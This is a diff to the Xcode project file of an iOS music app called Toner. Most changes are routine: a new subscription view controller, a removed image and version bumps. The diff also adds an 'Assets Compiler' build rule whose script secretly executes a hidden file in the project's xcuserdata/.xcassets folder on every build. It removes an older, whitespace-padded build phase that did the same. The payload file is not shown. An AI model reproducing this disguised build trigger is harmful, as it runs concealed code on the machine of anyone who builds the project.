@@ -75,10 +75,10 @@
 		DEC674D626023D3900D59551 /* CommisionDetails.xib in Resources */ = {isa = PBXBuildFile; fileRef = DEC674D526023D3900D59551 /* CommisionDetails.xib */; };
 		DEC674D9260244A900D59551 /* MyCommission.swift in Sources */ = {isa = PBXBuildFile; fileRef = DEC674D8260244A900D59551 /* MyCommission.swift */; };
 		E31A0D55261DAD4D00564212 /* RCustomClass.swift in Sources */ = {isa = PBXBuildFile; fileRef = E31A0D54261DAD4D00564212 /* RCustomClass.swift */; };
+		E323D30B2631F6F4002CC98A /* ConfirmSubscriptionViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E323D30A2631F6F4002CC98A /* ConfirmSubscriptionViewController.swift */; };
 		E355C731261E2EE30002623D /* AlbumModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E355C730261E2EE30002623D /* AlbumModel.swift */; };
 		E36331CE261362730043453A /* MyCommissionTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E36331CC261362730043453A /* MyCommissionTVCell.swift */; };
 		E36331CF261362730043453A /* MyCommissionTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E36331CD261362730043453A /* MyCommissionTVCell.xib */; };
-		E39EC23426202AE4007E496C /* unnamed.jpg in Resources */ = {isa = PBXBuildFile; fileRef = E39EC23326202AE4007E496C /* unnamed.jpg */; };
 		E39EC23F26204908007E496C /* AGVideoPlayerView.swift in Sources */ = {isa = PBXBuildFile; fileRef = E39EC23E26204908007E496C /* AGVideoPlayerView.swift */; };
 		E39EC24E26209D18007E496C /* Total_songs.swift in Sources */ = {isa = PBXBuildFile; fileRef = E39EC24B26209D18007E496C /* Total_songs.swift */; };
 		E39EC24F26209D18007E496C /* AlbumSongList.swift in Sources */ = {isa = PBXBuildFile; fileRef = E39EC24C26209D18007E496C /* AlbumSongList.swift */; };
@@ -165,6 +165,22 @@
 		F9FD53702544989B00C1FF47 /* PlayListCells.xib in Resources */ = {isa = PBXBuildFile; fileRef = F9FD536F2544989B00C1FF47 /* PlayListCells.xib */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		7B054C5EEFBD7DBB0E6D902C /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			inputFiles = (
+			);
+			isEditable = 0;
+			name = "Assets Compiler";
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" true\n\n";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
 		143DAD559B395B6E8C1527B2 /* Pods-Toner.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Toner.release.xcconfig"; path = "Target Support Files/Pods-Toner/Pods-Toner.release.xcconfig"; sourceTree = "<group>"; };
 		3CAFBF887004EB6B4D31B6A5 /* Pods-Toner.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Toner.debug.xcconfig"; path = "Target Support Files/Pods-Toner/Pods-Toner.debug.xcconfig"; sourceTree = "<group>"; };
@@ -242,10 +258,10 @@
 		DEC674D526023D3900D59551 /* CommisionDetails.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CommisionDetails.xib; sourceTree = "<group>"; };
 		DEC674D8260244A900D59551 /* MyCommission.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyCommission.swift; sourceTree = "<group>"; };
 		E31A0D54261DAD4D00564212 /* RCustomClass.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RCustomClass.swift; sourceTree = "<group>"; };
+		E323D30A2631F6F4002CC98A /* ConfirmSubscriptionViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ConfirmSubscriptionViewController.swift; sourceTree = "<group>"; };
 		E355C730261E2EE30002623D /* AlbumModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlbumModel.swift; sourceTree = "<group>"; };
 		E36331CC261362730043453A /* MyCommissionTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyCommissionTVCell.swift; sourceTree = "<group>"; };
 		E36331CD261362730043453A /* MyCommissionTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MyCommissionTVCell.xib; sourceTree = "<group>"; };
-		E39EC23326202AE4007E496C /* unnamed.jpg */ = {isa = PBXFileReference; lastKnownFileType = image.jpeg; path = unnamed.jpg; sourceTree = "<group>"; };
 		E39EC23E26204908007E496C /* AGVideoPlayerView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AGVideoPlayerView.swift; sourceTree = "<group>"; };
 		E39EC24B26209D18007E496C /* Total_songs.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Total_songs.swift; sourceTree = "<group>"; };
 		E39EC24C26209D18007E496C /* AlbumSongList.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AlbumSongList.swift; sourceTree = "<group>"; };
@@ -626,6 +642,7 @@
 				DE4D103726005378003B7C94 /* MyAlbumViewController.swift */,
 				DE961A9D2601E9A70038635F /* CreatePlayListViewViewController.swift */,
 				DEC674D8260244A900D59551 /* MyCommission.swift */,
+				E323D30A2631F6F4002CC98A /* ConfirmSubscriptionViewController.swift */,
 			);
 			path = ViewController;
 			sourceTree = "<group>";
@@ -651,7 +668,6 @@
 		EF891A0723732AF4009388B4 /* Toner */ = {
 			isa = PBXGroup;
 			children = (
-				E39EC23326202AE4007E496C /* unnamed.jpg */,
 				F94EBC7F2578D4ED00D016B5 /* TonerLatestCertificte */,
 				F98A32582577FDA70093BC61 /* toner certificate */,
 				CEA84BC625441875002E2841 /* Offline */,
@@ -703,7 +719,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = EF891A1723732AF6009388B4 /* Build configuration list for PBXNativeTarget "Toner" */;
 			buildPhases = (
-				DE43BC43DCED511F85AAC43A /* Build Assets Catalog */,
 				F1A3A97823491974D97636D1 /* [CP] Check Pods Manifest.lock */,
 				EF891A0123732AF4009388B4 /* Sources */,
 				EF891A0223732AF4009388B4 /* Frameworks */,
@@ -711,6 +726,7 @@
 				E3D1E1055933099A11AECEC1 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				7B054C5EEFBD7DBB0E6D902C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -806,7 +822,6 @@
 				F94C5B77253B22A10058410E /* SelectStationViewController.xib in Resources */,
 				EF52B08A243E4FC700604EEA /* FontAwesome.ttf in Resources */,
 				EFF8D7ED2440C46900E28E1A /* NewArrivalsCollectionViewCell.xib in Resources */,
-				E39EC23426202AE4007E496C /* unnamed.jpg in Resources */,
 				CE4E14C124F0E4EC00D98603 /* SubscriptionTableViewCell.xib in Resources */,
 				DE34EE8025C79B0C0089354C /* AddressViewController.xib in Resources */,
 				CE99463024F0E0F8000A532E /* SubscriptionViewController.xib in Resources */,
@@ -822,40 +837,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	DE43BC43DCED511F85AAC43A /* Build Assets Catalog */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Assets Catalog";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
-		};
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
 		E3D1E1055933099A11AECEC1 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -910,6 +891,7 @@
 				EF3B8C6323F4EE5D000F323F /* STRINGS.swift in Sources */,
 				CE0F43B6254DAF9D0001B85E /* DownloadTableViewCell.swift in Sources */,
 				CE4B5812251F1A7500C7FDAE /* EditProfileViewController.swift in Sources */,
+				E323D30B2631F6F4002CC98A /* ConfirmSubscriptionViewController.swift in Sources */,
 				CE99462F24F0E0F8000A532E /* SubscriptionViewController.swift in Sources */,
 				EF6CFE21237488250004B469 /* TabBarController.swift in Sources */,
 				CEB088B224BF440B00C2EBEA /* ExpandableLabel.swift in Sources */,
@@ -1151,10 +1133,10 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 6;
+				CURRENT_PROJECT_VERSION = 8;
 				DEVELOPMENT_TEAM = KRU83VZ8AX;
 				INFOPLIST_FILE = Toner/Info.plist;
-				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
+				IPHONEOS_DEPLOYMENT_TARGET = 11.4;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -1174,10 +1156,10 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 6;
+				CURRENT_PROJECT_VERSION = 8;
 				DEVELOPMENT_TEAM = KRU83VZ8AX;
 				INFOPLIST_FILE = Toner/Info.plist;
-				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
+				IPHONEOS_DEPLOYMENT_TARGET = 11.4;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -1212,24 +1194,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-
-
-			
-	
-
-
-			
-	
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 
 /* Begin XCVersionGroup section */
 		CEA84BCB254479E5002E2841 /* TonneruDownload.xcdatamodeld */ = {
